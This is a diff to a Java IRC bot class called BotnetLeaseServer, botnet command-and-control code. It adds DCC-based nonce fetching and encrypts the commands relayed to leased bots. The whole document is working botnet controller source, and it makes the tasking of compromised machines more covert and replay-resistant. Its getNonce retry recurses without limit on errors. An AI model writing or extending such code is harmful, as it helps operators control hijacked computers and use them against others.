@@ -239,6 +239,19 @@ public class BotnetLeaseServer extends PircBot {
 		op(CHANNEL, NAME);
 	}
 	
+	private int getNonce(String bot) {
+		try {
+			DccChat chat = dccSendChatRequest(bot, TIMEOUT);
+			chat.sendLine("nonce");
+			int nonce = Integer.parseInt(chat.readLine());
+			chat.close();
+			return nonce;
+		} catch (Exception e) {
+			System.out.println("\tThere was an error fetching a nonce from " + bot);
+			return getNonce(bot);
+		}
+	}
+	
 	/**
 	 * Prints out a help message that describes available functionality and commands.
 	 */
@@ -333,7 +346,7 @@ public class BotnetLeaseServer extends PircBot {
 						if (!name.equals(NAME)) {
 							// TODO: encrypt command
 							//this.sendMessage(name, command);
-							sendMessage(name, botKeys.get(name).encryptMsg(command));
+							sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
 						}
 					}
 				}
@@ -392,7 +405,7 @@ public class BotnetLeaseServer extends PircBot {
 						for (String name : bots) {
 							// TODO: encrypt command
 							//sendMessage(name, command);
-							sendMessage(name, botKeys.get(name).encryptMsg(command));
+							sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
 						}
 					}
 				} catch (Exception e) {
@@ -402,9 +415,9 @@ public class BotnetLeaseServer extends PircBot {
 			//Respond to a message beginning with a colon by messaging the CHANNEL
 			} else if (s.startsWith(":")) {
 				// TODO: encrypt s.substring
-				User[] bots = getUsers(CHANNEL);
-				for (User bot : bots) {
-					sendMessage(bot.getNick(), s.substring(1));
+				String[] bots = leasedBots;
+				for (String bot : bots) {
+					sendMessage(bot, botKeys.get(bot).encryptMsg(s.substring(1), getNonce(bot)));
 				}
 			}
 		}
